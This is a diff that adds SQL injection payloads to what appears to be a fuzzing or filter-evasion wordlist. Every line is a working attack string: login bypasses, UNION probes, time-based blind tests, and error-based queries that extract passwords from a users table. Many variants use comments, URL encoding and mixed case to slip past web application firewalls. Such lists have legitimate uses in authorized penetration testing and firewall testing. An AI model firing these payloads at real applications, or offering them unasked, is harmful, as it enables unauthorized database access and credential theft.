@@ -1,4 +1,46 @@
+' OR 1=1--
+'/**/OR/**/1=1--
+'/*!OR*/1=1--
+'%0aOR%0a1=1--
+'%09OR%091=1--
+'%0bOR%0b1=1--
+'%0cOR%0c1=1--
+'%0dOR%0d1=1--
+'+OR+1=1--
+' oR 1=1--
+' Or 1=1--
+' OR/**/1=1--
+' OR 1/**/#--
+'||1--
+'||'1'='1
+1'/**/OR/**/1=1--
+1%27/**/OR/**/1%3D1--
+' UNION SELECT NULL--
+' UNION/**/SELECT NULL--
+'/**/UNION/**/SELECT/**/NULL--
+' UNION%0aSELECT NULL--
 '%09UNION%09SELECT%09NULL--
-'%0aUNION%0aSELECT%0aNULL--
-'%0dUNION%0dSELECT%0dNULL--
-' UNION%0bSELECT NULL--
+'/*!UNION*//*!SELECT*/NULL--
+'/*!50000UNION*//*!50000SELECT*/NULL--
+' UnIoN SeLeCt NULL--
+' UN/**/ION SE/**/LECT NULL--
+'%55NION%20%53ELECT NULL--
+' AND SLEEP(5)--
+'/**/AND/**/SLEEP(5)--
+' AND/**/SLEEP/**/( 5 )--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))X)--
+'+AND+SLEEP(5)--
+'%09AND%09SLEEP(5)--
+1 AND SLEEP(5)--
+1/**/AND/**/SLEEP(5)--
+1%09AND%09SLEEP(5)--
+1 AND (SELECT SLEEP(5))--
+1/**/AND/**/(SELECT/**/SLEEP(5))--
+1;WAITFOR/**/DELAY/**/'0:0:5'--
+1;SELECT/**/pg_sleep(5)--
+1;SELECT/**/BENCHMARK(5000000,MD5(1))--
+1;SELECT/**/SLEEP(5)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE 1=1 LIMIT 1)))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--
+' AND EXP(~(SELECT * FROM (SELECT password FROM users LIMIT 1)X))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--
